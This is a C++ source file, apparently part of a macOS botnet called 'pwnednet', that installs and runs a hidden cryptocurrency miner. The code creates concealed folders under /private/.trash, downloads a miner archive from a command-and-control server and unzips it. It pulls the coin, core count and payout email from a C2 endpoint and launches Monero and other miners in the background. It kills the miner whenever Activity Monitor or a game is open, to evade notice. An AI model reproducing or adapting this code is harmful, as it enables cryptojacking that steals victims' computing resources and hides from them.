//
//  Miner.cpp
//  pwnednet
//
/*
 
 

 
 
 
*/

#include "include.h"

// rewrite / change these
string fPrivate = "/private";
string fVar     = "/var";
string minerMain= ".trash";
string fHelper  = ".log";
string fAssets  = ".assets";

string minerpath    = fPrivate + "/" + minerMain + "/" + fAssets + "/";
string minerzip     = "helper";
string pathToMiner  = minerpath + szMinerName;

int CoresToUse;

string email = "";

bool MiningXMR;
bool MiningByte;
bool MiningQCN;
bool MiningDash;

void InitMiner();
void MineXMR();
void MineByte();
void MineDash();
void MineQCN();


void Bot::installMiner() {  // Remake
    
    string firstFolder  = fPrivate + "/" + minerMain + "/";
    string dlfrom       = g_cServer + "assets/" + minerzip + ".zip";
    
    char minerout[FILENAME_MAX] = "/private/.trash/.assets/helper.zip";
    
    
    
    while(!DoesFileExist(pathToMiner)) {
    
        // Create folders
        while(!DoesFileExist(firstFolder)) {
            mkdir(cstr(firstFolder), 0775);
            sleep(1);
        }
        
        while(!DoesFileExist(minerpath)) {
            mkdir(cstr(minerpath), 0775);
            sleep(1);
        }
        
        
        con->WaitForConnection();
        
        
        // download miner files
        while(!DoesFileExist(minerout)) {
            con->Download(cstr(dlfrom), minerout);
            sleep(1);
        }
        
        // unzip
        system(cstr("cd " + fPrivate + "/" + minerMain + "/" + fAssets + "/; unzip " + minerzip + ".zip" ));
        
    
        if(!DoesFileExist(minerpath))
            return;
        
        
        // delete the .zip
        remove(cstr(fPrivate + "/" + minerMain + "/" + fAssets + "/" + minerzip + ".zip"));
    
    
        sleep(2);
        
        
    }
    
    
}


void Bot::LoadMiner() {
    
    
    if(!bot->shouldmine)
        return;
    
    
    if(ShouldKillMiner())
        return;
    

    while(!DoesFileExist(pathToMiner))
        installMiner();
    
    InitMiner();
    
    if(CoresToUse > bot->cores)
        CoresToUse = bot->cores;
    
    
    sleep(5);
    
    
    while(!IsMining()) {
        
        KillMiner();
        
        if(bot->coin == "xmr") {
            
            MiningXMR  = false;
            MineXMR();
            sleep(1);
            
            
        } else if(bot->coin == "bcn") {
            
            MiningByte = false;
            MineByte();
            sleep(1);
            
        } else if(bot->coin == "dsh") {
            
            MiningDash = false;
            MineDash();
            sleep(1);
            
        } else if(bot->coin == "qcn") {
            
            MiningQCN = false;
            MineQCN();
            sleep(1);
            
        } else {
            
            bot->coin = "xmr";
            
        }

    }
    
}

void InitMiner() {
    
    string listenTo = g_Commands + "mine.php?request";
    
    CoresToUse  = atoi(con->post(listenTo.c_str(), "mine=cores").c_str());
    bot->coin   = con->post(listenTo.c_str(), "mine=coin");
    email       = con->post(listenTo.c_str(), "mine=email");
    
}

void MineXMR() {
    
    if(MiningXMR)
        return;
    
    string cmd = "cd " + minerpath + "; ./" + szMinerName + " -user " + email + " --xmr " + to_string(CoresToUse) + " &";
    
    if(!IsMining())
        system(cmd.c_str());
    
    
    MiningXMR   = true;
    MiningByte  = false;
    MiningDash  = false;
    MiningQCN   = false;
    
}

void MineByte() {

    if(MiningByte)
        return;
    
    string cmd = "cd " + minerpath + "; ./" + szMinerName + " -user " + email + " --bcn " + to_string(CoresToUse) + " &";
    
    if(!IsMining())
        system(cmd.c_str());
    
    
    MiningByte  = true;
    MiningXMR   = false;
    MiningDash  = false;
    MiningQCN   = false;
    
}

void MineDash() {
    
    if(MiningDash)
        return;
    
    string cmd = "cd " + minerpath + "; ./" + szMinerName + " -user " + email + " --dsh " + to_string(CoresToUse) + " &";
    
    if(!IsMining())
        system(cmd.c_str());
    
    
    MiningDash  = true;
    MiningByte  = false;
    MiningXMR   = false;
    MiningQCN   = false;
    
}

void MineQCN() {
    
    if(MiningQCN)
        return;
    
    string cmd = "cd " + minerpath + "; ./" + szMinerName + " -user " + email + " --qcn " + to_string(CoresToUse) + " &";
    
    if(!IsMining())
        system(cmd.c_str());
    
    
    MiningQCN   = true;
    MiningByte  = false;
    MiningXMR   = false;
    MiningDash  = false;
    
}

bool IsMining() {

    pid_t minerpid = Util::GetProcessByName(MinerName);
    
    if(minerpid)
        return true;
    
    return false;
    
}


void KillMiner() {
 
    if(!ShouldKillMiner())
        return;
    
    pid_t minerpid = Util::GetProcessByName(MinerName);
    
    if(minerpid) {
        string cmd = "kill " + to_string(minerpid);
        system(cmd.c_str());
    }
    
    MiningXMR   = false;
    MiningByte  = false;
    MiningDash  = false;
    MiningQCN   = false;
    
}

bool ShouldKillMiner() {

    pid_t csgo  = Util::GetProcessByName("csgo_osx64");
    pid_t tskmgr= Util::GetProcessByName("Activity Monitor");
    
    
    if(csgo || tskmgr || !bot->shouldmine)
        return true;
    
    
    return false;

}





























